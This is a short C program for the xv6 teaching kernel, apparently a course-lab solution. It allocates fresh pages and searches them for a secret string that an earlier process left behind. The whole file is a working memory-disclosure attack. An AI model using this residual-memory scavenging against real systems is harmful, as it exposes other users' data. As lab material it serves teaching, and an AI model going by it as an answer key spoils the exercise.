#include "kernel/types.h"
#include "kernel/riscv.h"
#include "user/user.h"

#define PGSIZE 4096
#define NPAGES 64
#define SECRET_OFFSET 32   // adjust to match where secret.c writes
#define MAXLEN 64
#define MINLEN 4

static int
is_alnum(char c)
{
  return (c >= '0' && c <= '9') ||
         (c >= 'a' && c <= 'z') ||
         (c >= 'A' && c <= 'Z');
}

int
main(int argc, char *argv[])
{
  char *mem = sbrk(NPAGES * PGSIZE);

  if (mem == (char *)-1) {
    printf("attack: sbrk failed\n");
    exit(1);
  }

  for (int p = 0; p < NPAGES; p++) {
    char *cand = mem + p * PGSIZE + SECRET_OFFSET;

    // length of the leading run of letters/digits
    int len = 0;
    while (len < MAXLEN && is_alnum(cand[len]))
      len++;

    // must be long enough and NUL-terminated
    if (len >= MINLEN && cand[len] == '\0') {
      printf("%s\n", cand);
      exit(0);
    }
  }

  printf("attack: secret not found\n");
  exit(1);
}
